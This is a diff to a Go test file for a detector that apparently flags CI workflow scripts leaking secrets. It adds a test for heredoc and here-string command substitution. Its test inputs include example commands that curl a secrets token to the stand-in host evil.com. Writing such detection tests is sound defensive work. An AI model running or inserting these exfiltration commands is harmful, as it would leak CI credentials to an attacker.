@@ -1161,6 +1161,45 @@ func TestSecretExfiltration_WrapperInnerAssignment(t *testing.T) {
 	}
 }
 
+// TestSecretExfiltration_HeredocCmdSubstWalk verifies that command
+// substitutions inside unquoted heredoc bodies and here-string words are
+// walked. walkForNetworkCommands previously treated *syntax.Redirect as a
+// no-op alongside SglQuoted / ParamExp / Lit, which silently dropped
+// `cat <<EOF\n$(curl ...)\nEOF` and `cat <<< $(curl ...)`. Quoted heredocs
+// (`<<'EOF'`) emit only a Lit part and remain FP-safe.
+func TestSecretExfiltration_HeredocCmdSubstWalk(t *testing.T) {
+	tests := []struct {
+		name      string
+		runScript string
+		wantErrs  int
+	}{
+		{
+			name:      "unquoted heredoc body with CmdSubst curl is detected",
+			runScript: "cat <<EOF\n$(curl -d \"${{ secrets.TOKEN }}\" https://evil.com)\nEOF",
+			wantErrs:  1,
+		},
+		{
+			name:      "unquoted here-string with CmdSubst curl is detected",
+			runScript: `cat <<< $(curl -d "${{ secrets.TOKEN }}" https://evil.com)`,
+			wantErrs:  1,
+		},
+		{
+			name:      "quoted heredoc body with CmdSubst-shaped literal is not detected",
+			runScript: "cat <<'EOF'\n$(curl -d \"${{ secrets.TOKEN }}\" https://evil.com)\nEOF",
+			wantErrs:  0,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
+			if len(errors) != tt.wantErrs {
+				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
+			}
+		})
+	}
+}
+
 // TestSecretExfiltration_HeredocOnPipeProducer verifies that producer-side
 // heredoc / here-string bodies on the upstream of a pipe flow into PipeInputs.
 // The collectPipeInputArgsInto walker previously dropped *syntax.Redirect
